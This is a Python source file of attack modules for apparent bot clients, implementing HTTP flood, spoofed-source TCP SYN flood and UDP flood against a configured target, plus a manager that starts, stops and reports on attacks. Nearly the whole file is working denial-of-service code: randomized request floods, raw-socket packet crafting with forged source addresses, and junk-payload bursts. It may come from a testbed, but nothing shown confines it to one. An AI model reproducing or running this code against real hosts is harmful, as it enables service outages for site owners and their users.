"""
Attack traffic generation modules for Linux bot clients.
"""
import asyncio
import aiohttp
import socket
import struct
import random
import time
import logging
from datetime import datetime
from typing import Dict, Any, Optional, List
from abc import ABC, abstractmethod

from shared.models import AttackConfig, AttackType
from shared.utils import get_system_metrics


class AttackModule(ABC):
    """Base class for attack modules."""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.logger = logging.getLogger(f"{__name__}.{self.__class__.__name__}")
        self.running = False
        self.attack_task: Optional[asyncio.Task] = None
        
        # Statistics
        self.requests_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.start_time: Optional[datetime] = None
        self.last_stats_time = datetime.now()
        
        # Rate limiting
        self.rate_limiter = asyncio.Semaphore(config.intensity)
        self.request_interval = 1.0 / config.intensity if config.intensity > 0 else 0.1
    
    @abstractmethod
    async def execute_attack(self):
        """Execute the specific attack logic."""
        pass
    
    async def start(self) -> bool:
        """Start the attack module."""
        if self.running:
            self.logger.warning("Attack module already running")
            return False
        
        try:
            self.running = True
            self.start_time = datetime.now()
            self.attack_task = asyncio.create_task(self._attack_worker())
            
            self.logger.info(f"Attack started: {self.config.attack_type.value} -> {self.config.target_ip}:{self.config.target_port}")
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to start attack: {e}")
            self.running = False
            return False
    
    async def stop(self):
        """Stop the attack module."""
        self.running = False
        
        if self.attack_task and not self.attack_task.done():
            self.attack_task.cancel()
            try:
                await self.attack_task
            except asyncio.CancelledError:
                pass
        
        self.logger.info(f"Attack stopped. Stats: {self.get_statistics()}")
    
    async def _attack_worker(self):
        """Main attack worker loop."""
        try:
            # Check if attack has a duration limit
            end_time = None
            if self.config.duration > 0:
                end_time = datetime.now().timestamp() + self.config.duration
            
            while self.running:
                # Check duration limit
                if end_time and datetime.now().timestamp() >= end_time:
                    self.logger.info("Attack duration limit reached")
                    break
                
                # Execute attack with rate limiting
                async with self.rate_limiter:
                    try:
                        await self.execute_attack()
                        self.requests_sent += 1
                    except Exception as e:
                        self.errors += 1
                        self.logger.debug(f"Attack request failed: {e}")
                
                # Rate limiting delay
                if self.request_interval > 0:
                    await asyncio.sleep(self.request_interval)
        
        except asyncio.CancelledError:
            pass
        except Exception as e:
            self.logger.error(f"Error in attack worker: {e}")
        finally:
            self.running = False
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get attack statistics."""
        now = datetime.now()
        duration = (now - self.start_time).total_seconds() if self.start_time else 0
        
        return {
            "attack_type": self.config.attack_type.value,
            "target": f"{self.config.target_ip}:{self.config.target_port}",
            "running": self.running,
            "duration": duration,
            "requests_sent": self.requests_sent,
            "bytes_sent": self.bytes_sent,
            "errors": self.errors,
            "requests_per_second": self.requests_sent / duration if duration > 0 else 0,
            "bytes_per_second": self.bytes_sent / duration if duration > 0 else 0,
            "error_rate": self.errors / max(self.requests_sent, 1),
            "start_time": self.start_time.isoformat() if self.start_time else None,
            "last_update": now.isoformat()
        }


class HTTPFloodAttack(AttackModule):
    """HTTP flood attack module targeting Windows victim."""
    
    def __init__(self, config: AttackConfig):
        super().__init__(config)
        self.session: Optional[aiohttp.ClientSession] = None
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124"
        ]
        
        # HTTP paths to target
        self.target_paths = [
            "/",
            "/index.html",
            "/home",
            "/login",
            "/search",
            "/api/data",
            "/images/logo.png",
            "/css/style.css",
            "/js/app.js"
        ]
    
    async def start(self) -> bool:
        """Start HTTP flood attack."""
        try:
            # Create aiohttp session with timeout
            timeout = aiohttp.ClientTimeout(total=5, connect=2)
            connector = aiohttp.TCPConnector(
                limit=100,
                limit_per_host=50,
                ttl_dns_cache=300,
                use_dns_cache=True
            )
            
            self.session = aiohttp.ClientSession(
                timeout=timeout,
                connector=connector,
                headers={"User-Agent": random.choice(self.user_agents)}
            )
            
            return await super().start()
        
        except Exception as e:
            self.logger.error(f"Failed to initialize HTTP session: {e}")
            return False
    
    async def stop(self):
        """Stop HTTP flood attack."""
        await super().stop()
        
        if self.session:
            await self.session.close()
            self.session = None
    
    async def execute_attack(self):
        """Execute HTTP flood request."""
        if not self.session:
            raise Exception("HTTP session not initialized")
        
        # Randomize request parameters
        path = random.choice(self.target_paths)
        method = random.choice(["GET", "POST", "HEAD"])
        
        # Build URL
        protocol = "https" if self.config.target_port == 443 else "http"
        url = f"{protocol}://{self.config.target_ip}:{self.config.target_port}{path}"
        
        # Add random query parameters
        if random.random() < 0.3:  # 30% chance
            query_params = {
                "t": str(int(time.time())),
                "r": str(random.randint(1000, 9999)),
                "q": "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
            }
            url += "?" + "&".join(f"{k}={v}" for k, v in query_params.items())
        
        # Prepare headers
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        }
        
        # Add referer sometimes
        if random.random() < 0.5:
            headers["Referer"] = f"{protocol}://{self.config.target_ip}:{self.config.target_port}/"
        
        # Prepare data for POST requests
        data = None
        if method == "POST":
            if random.random() < 0.5:
                # Form data
                data = {
                    "username": "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8)),
                    "password": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=12)),
                    "action": "login"
                }
            else:
                # JSON data
                data = {
                    "query": "".join(random.choices("abcdefghijklmnopqrstuvwxyz ", k=20)),
                    "timestamp": int(time.time()),
                    "random": random.randint(1, 1000000)
                }
                headers["Content-Type"] = "application/json"
        
        # Execute request
        try:
            async with self.session.request(method, url, headers=headers, data=data) as response:
                # Read response to complete the request
                content = await response.read()
                self.bytes_sent += len(content) if content else 0
                
                # Log successful responses occasionally
                if self.requests_sent % 100 == 0:
                    self.logger.debug(f"HTTP {method} {url} -> {response.status}")
        
        except asyncio.TimeoutError:
            # Timeout is expected in flood attacks
            pass
        except Exception as e:
            # Re-raise to be caught by the worker
            raise e


class TCPSYNFloodAttack(AttackModule):
    """TCP SYN flood attack module using raw sockets."""
    
    def __init__(self, config: AttackConfig):
        super().__init__(config)
        self.socket: Optional[socket.socket] = None
        self.source_ports = list(range(1024, 65535))
        random.shuffle(self.source_ports)
        self.port_index = 0
    
    async def start(self) -> bool:
        """Start TCP SYN flood attack."""
        try:
            # Create raw socket (requires root privileges)
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            self.socket.setblocking(False)
            
            self.logger.info("Raw socket created for TCP SYN flood")
            return await super().start()
        
        except PermissionError:
            self.logger.error("TCP SYN flood requires root privileges for raw sockets")
            return False
        except Exception as e:
            self.logger.error(f"Failed to create raw socket: {e}")
            return False
    
    async def stop(self):
        """Stop TCP SYN flood attack."""
        await super().stop()
        
        if self.socket:
            self.socket.close()
            self.socket = None
    
    def _get_next_source_port(self) -> int:
        """Get next source port in rotation."""
        port = self.source_ports[self.port_index]
        self.port_index = (self.port_index + 1) % len(self.source_ports)
        return port
    
    def _calculate_checksum(self, data: bytes) -> int:
        """Calculate TCP/IP checksum."""
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += checksum >> 16
        return ~checksum & 0xFFFF
    
    def _create_ip_header(self, source_ip: str, dest_ip: str, payload_length: int) -> bytes:
        """Create IP header."""
        version = 4
        ihl = 5
        tos = 0
        total_length = 20 + payload_length  # IP header + TCP header
        identification = random.randint(1, 65535)
        flags = 0
        fragment_offset = 0
        ttl = 64
        protocol = socket.IPPROTO_TCP
        checksum = 0  # Will be calculated
        source = socket.inet_aton(source_ip)
        dest = socket.inet_aton(dest_ip)
        
        # Pack IP header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               (version << 4) + ihl,
                               tos,
                               total_length,
                               identification,
                               (flags << 13) + fragment_offset,
                               ttl,
                               protocol,
                               checksum,
                               source,
                               dest)
        
        # Calculate checksum
        checksum = self._calculate_checksum(ip_header)
        
        # Repack with correct checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               (version << 4) + ihl,
                               tos,
                               total_length,
                               identification,
                               (flags << 13) + fragment_offset,
                               ttl,
                               protocol,
                               checksum,
                               source,
                               dest)
        
        return ip_header
    
    def _create_tcp_header(self, source_ip: str, dest_ip: str, source_port: int, dest_port: int) -> bytes:
        """Create TCP SYN header."""
        seq_num = random.randint(1, 4294967295)
        ack_num = 0
        data_offset = 5  # TCP header length in 32-bit words
        reserved = 0
        flags = 0x02  # SYN flag
        window_size = random.randint(1024, 65535)
        checksum = 0  # Will be calculated
        urgent_pointer = 0
        
        # Pack TCP header
        tcp_header = struct.pack('!HHLLBBHHH',
                                source_port,
                                dest_port,
                                seq_num,
                                ack_num,
                                (data_offset << 4) + reserved,
                                flags,
                                window_size,
                                checksum,
                                urgent_pointer)
        
        # Create pseudo header for checksum calculation
        source = socket.inet_aton(source_ip)
        dest = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        pseudo_header = struct.pack('!4s4sBBH', source, dest, placeholder, protocol, tcp_length)
        pseudo_packet = pseudo_header + tcp_header
        
        # Calculate checksum
        checksum = self._calculate_checksum(pseudo_packet)
        
        # Repack with correct checksum
        tcp_header = struct.pack('!HHLLBBHHH',
                                source_port,
                                dest_port,
                                seq_num,
                                ack_num,
                                (data_offset << 4) + reserved,
                                flags,
                                window_size,
                                checksum,
                                urgent_pointer)
        
        return tcp_header
    
    async def execute_attack(self):
        """Execute TCP SYN flood packet."""
        if not self.socket:
            raise Exception("Raw socket not initialized")
        
        # Generate random source IP (spoofed)
        source_ip = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
        source_port = self._get_next_source_port()
        
        # Create headers
        tcp_header = self._create_tcp_header(source_ip, self.config.target_ip, source_port, self.config.target_port)
        ip_header = self._create_ip_header(source_ip, self.config.target_ip, len(tcp_header))
        
        # Combine packet
        packet = ip_header + tcp_header
        
        # Send packet
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(
                None,
                self.socket.sendto,
                packet,
                (self.config.target_ip, self.config.target_port)
            )
            self.bytes_sent += len(packet)
        
        except Exception as e:
            raise e


class UDPFloodAttack(AttackModule):
    """UDP flood attack module."""
    
    def __init__(self, config: AttackConfig):
        super().__init__(config)
        self.socket: Optional[socket.socket] = None
        self.payloads = [
            b"A" * 64,
            b"B" * 128,
            b"C" * 256,
            b"D" * 512,
            b"E" * 1024,
            b"\x00" * 100,
            b"\xFF" * 100,
            random.randbytes(200),
            random.randbytes(500),
            random.randbytes(1000)
        ]
    
    async def start(self) -> bool:
        """Start UDP flood attack."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.socket.setblocking(False)
            
            self.logger.info("UDP socket created for flood attack")
            return await super().start()
        
        except Exception as e:
            self.logger.error(f"Failed to create UDP socket: {e}")
            return False
    
    async def stop(self):
        """Stop UDP flood attack."""
        await super().stop()
        
        if self.socket:
            self.socket.close()
            self.socket = None
    
    async def execute_attack(self):
        """Execute UDP flood packet."""
        if not self.socket:
            raise Exception("UDP socket not initialized")
        
        # Select random payload
        payload = random.choice(self.payloads)
        
        # Add some randomization to payload
        if random.random() < 0.3:
            extra_data = random.randbytes(random.randint(10, 100))
            payload = payload + extra_data
        
        # Send UDP packet
        try:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(
                None,
                self.socket.sendto,
                payload,
                (self.config.target_ip, self.config.target_port)
            )
            self.bytes_sent += len(payload)
        
        except Exception as e:
            raise e


class AttackManager:
    """Manages attack modules for bot clients."""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.current_attack: Optional[AttackModule] = None
        self.attack_history: List[Dict[str, Any]] = []
    
    def create_attack_module(self, config: AttackConfig) -> Optional[AttackModule]:
        """Create appropriate attack module based on configuration."""
        try:
            if config.attack_type == AttackType.HTTP_FLOOD:
                return HTTPFloodAttack(config)
            elif config.attack_type == AttackType.TCP_SYN:
                return TCPSYNFloodAttack(config)
            elif config.attack_type == AttackType.UDP_FLOOD:
                return UDPFloodAttack(config)
            else:
                self.logger.error(f"Unknown attack type: {config.attack_type}")
                return None
        
        except Exception as e:
            self.logger.error(f"Failed to create attack module: {e}")
            return None
    
    async def start_attack(self, config: AttackConfig) -> bool:
        """Start a new attack."""
        try:
            # Stop current attack if running
            if self.current_attack:
                await self.stop_attack()
            
            # Create new attack module
            attack_module = self.create_attack_module(config)
            if not attack_module:
                return False
            
            # Start attack
            success = await attack_module.start()
            if success:
                self.current_attack = attack_module
                self.logger.info(f"Attack started: {config.attack_type.value}")
                return True
            else:
                return False
        
        except Exception as e:
            self.logger.error(f"Failed to start attack: {e}")
            return False
    
    async def stop_attack(self) -> bool:
        """Stop current attack."""
        try:
            if not self.current_attack:
                self.logger.warning("No active attack to stop")
                return False
            
            # Get final statistics
            final_stats = self.current_attack.get_statistics()
            
            # Stop attack
            await self.current_attack.stop()
            
            # Add to history
            self.attack_history.append(final_stats)
            
            # Limit history size
            if len(self.attack_history) > 100:
                self.attack_history = self.attack_history[-100:]
            
            self.current_attack = None
            self.logger.info("Attack stopped")
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to stop attack: {e}")
            return False
    
    def get_attack_status(self) -> Dict[str, Any]:
        """Get current attack status."""
        if self.current_attack:
            stats = self.current_attack.get_statistics()
            
            # Add system metrics
            system_metrics = get_system_metrics()
            stats["system_metrics"] = {
                "cpu_percent": system_metrics.get("cpu_percent", 0),
                "memory_percent": system_metrics.get("memory_percent", 0),
                "network_bytes_sent": system_metrics.get("network_bytes_sent", 0),
                "network_bytes_recv": system_metrics.get("network_bytes_recv", 0)
            }
            
            return stats
        else:
            return {
                "running": False,
                "message": "No active attack"
            }
    
    def get_attack_history(self, limit: int = 10) -> List[Dict[str, Any]]:
        """Get attack history."""
        return self.attack_history[-limit:] if self.attack_history else []
    
    async def emergency_stop(self):
        """Emergency stop of all attacks."""
        try:
            if self.current_attack:
                await self.current_attack.stop()
                self.current_attack = None
            
            self.logger.critical("Emergency stop executed")
        
        except Exception as e:
            self.logger.error(f"Error during emergency stop: {e}")